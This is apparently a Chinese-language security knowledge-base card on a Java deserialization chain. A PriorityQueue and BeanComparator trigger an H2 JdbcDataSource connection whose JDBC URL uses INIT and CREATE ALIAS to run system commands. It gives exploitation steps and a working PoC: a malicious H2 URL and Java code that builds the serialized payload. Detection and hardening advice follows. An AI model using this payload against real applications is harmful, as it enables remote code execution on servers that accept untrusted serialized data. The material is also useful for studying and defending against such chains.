---
id: web-java-deserialization-h2-jdbc-init-create-alias-rce
title: 反序列化 Getter 链触发 H2 JDBC URL INIT 参数命令执行
type: scenario
domain: web
path: web/java/deserialization
technique: h2-jdbc-init-create-alias-rce
aliases:
- H2 JDBC INIT RCE
- CREATE ALIAS 命令执行
- JdbcDataSource 反序列化
- BeanComparator getConnection
- H2 1.4.200 RCE
tags:
- java
- deserialization
- h2
- jdbc
- commons-beanutils
- comparator
- jdk21
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-05'
affected_versions: H2 1.4.200（原文依赖；原文称 H2 2.x 利用难度增大）；JDK 21.0.11-ea
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:41:54+08:00'
  notes: 已对照原文核对：H2 1.4.200 JDBC URL INIT + CREATE ALIAS 执行 Java 源码、JdbcDataSource 可序列化、BeanComparator(connection)+PriorityQueue 触发 getConnection 的链与代码一致；未验证点：原文仅给完整代码与流程图，无该链执行输出，medium 合适；H2 1.4.200 为原文依赖版本，2.x 限制更严
---

## 一句话结论

当 classpath 含 H2 1.4.200 与 commons-beanutils 时，可把设置恶意 JDBC URL 的 `org.h2.jdbcx.JdbcDataSource` 放进 `BeanComparator("connection")` + `PriorityQueue` 链；反序列化重建堆时触发 `getConnection()`，H2 解析 URL 中的 `INIT` 参数执行 SQL，经 `CREATE ALIAS` 定义 Java 函数并 `CALL` 执行系统命令。

## 原理

- `org.h2.jdbcx.JdbcDataSource` 实现 `javax.sql.DataSource` 与 `Serializable`，其 URL 字段可被序列化携带。
- H2 1.4.200 支持在 JDBC URL 中通过 `INIT=` 在建立连接时自动执行 SQL；SQL 内可用 `CREATE ALIAS ... AS 'Java 源码'` 创建 Java 函数别名，再 `CALL` 该别名执行任意 Java 代码（`Runtime.getRuntime().exec`）。
- 触发链：`PriorityQueue.readObject()` 重建堆时调用 `comparator.compare(a,b)`；`BeanComparator("connection")` 通过 `PropertyUtils.getProperty(target, "connection")` 反射调用 `JdbcDataSource.getConnection()`；后者调用 `DriverManager.getConnection(url)`，H2 驱动解析 URL 并执行 `INIT` 中的 SQL。
- 该链不需要 `TemplatesImpl`、不需要 `--add-opens`、不依赖 JDK 内部类，因此在 JDK 17+/21 模块强封装下仍然可用；前提是 H2 驱动在 classpath 且版本支持 `INIT`。

## 触发条件

- classpath 含 `com.h2database:h2:1.4.200`（原文；H2 2.x 对 `INIT` 的限制更严，利用难度增大）。
- classpath 含 `commons-beanutils`（提供 `BeanComparator`）或等价的 Getter 触发链。
- 存在 Java 原生反序列化入口，且过滤器未拦截 `org.h2.**`、`org.apache.commons.beanutils.**`、`java.util.PriorityQueue` 等类。
- 目标进程可执行系统命令（通常继承应用权限）。

## 利用步骤

1. 构造恶意 JDBC URL：`jdbc:h2:mem:test;INIT=CREATE ALIAS ... EXEC ...\;CALL EXEC('cmd')`，注意 SQL 内分号用 `\;` 转义。
2. 实例化 `org.h2.jdbcx.JdbcDataSource`，调用 `setURL` 写入恶意 URL。
3. 构造 `BeanComparator("connection")` 并放入 `PriorityQueue`；先用无害元素填充，避免本地构造时触发。
4. 反射把 `PriorityQueue.queue` 替换为两个恶意 DataSource 元素。
5. 序列化并发送；目标反序列化 `PriorityQueue` 时触发 `compare` → `getConnection` → H2 `INIT` → `CALL` 执行命令。

## PoC

恶意 URL（H2 1.4.200）：

```text
jdbc:h2:mem:test;INIT=CREATE ALIAS IF NOT EXISTS EXEC AS
  'void exec(String cmd) throws Exception {
    Runtime.getRuntime().exec(cmd)\;
  }'\;
  CALL EXEC('touch /tmp/pwned')
```

序列化链构造：

```java
String jdbcUrl = "jdbc:h2:mem:test;INIT="
    + "CREATE ALIAS IF NOT EXISTS EXEC AS "
    + "'void exec(String cmd) throws Exception {"
    + "  Runtime.getRuntime().exec(cmd)\\;"
    + "}'\\;"
    + "CALL EXEC('" + command + "')";

Object ds = Class.forName("org.h2.jdbcx.JdbcDataSource")
    .getDeclaredConstructor().newInstance();
ds.getClass().getMethod("setURL", String.class).invoke(ds, jdbcUrl);

BeanComparator<Object> cmp = new BeanComparator<>("connection");
PriorityQueue<Object> queue = new PriorityQueue<>(2, cmp);
queue.add("1"); queue.add("2");

Field qf = PriorityQueue.class.getDeclaredField("queue");
qf.setAccessible(true);
qf.set(queue, new Object[]{ds, ds});

// 序列化 queue 即为 payload
```

## 变体与关联

- 变体：`getConnection` 也可由其他 Getter 链触发（Jackson `POJONode`、`ToStringBean` 等），不限于 `BeanComparator`。
- 变体：除 H2 的 `INIT` 外，其他 JDBC 驱动的连接串参数（如 MySQL `autoDeserialize`、`allowLoadLocalInfile`）也可构成同类“JDBC URL 注入 → 代码执行/文件读取”链。
- 关联：该链是 JDK 21 `TemplatesImpl` 被封后常见的替代 Sink 之一，与外部 Xalan、JNDI ObjectFactory 同属“后 TemplatesImpl”利用面。
- 关联卡片：[[web-java-deserialization-jdk-signedobject-nested-stream-filter-bypass]]、[[web-java-deserialization-external-xalan-templatesimpl-sink]]

## 检测与防御

- 检测：反序列化流中出现 `org.h2.jdbcx.JdbcDataSource`、`BeanComparator`、`PriorityQueue` 的组合。
- 检测：JDBC URL 中出现 `INIT=`、`CREATE ALIAS`、`RUNSCRIPT`、`\;` 等 H2 初始化执行特征。
- 检测：应用进程在反序列化后立即建立内存数据库连接并派生系统进程。
- 修复：升级 H2 到 2.x 并禁止 URL 中的 `INIT`；生产环境移除 H2 依赖（仅测试使用）。
- 加固：反序列化白名单拒绝 `org.h2.**`、`org.apache.commons.beanutils.**`；对 JDBC URL 做来源白名单；消除 Java 原生反序列化入口。
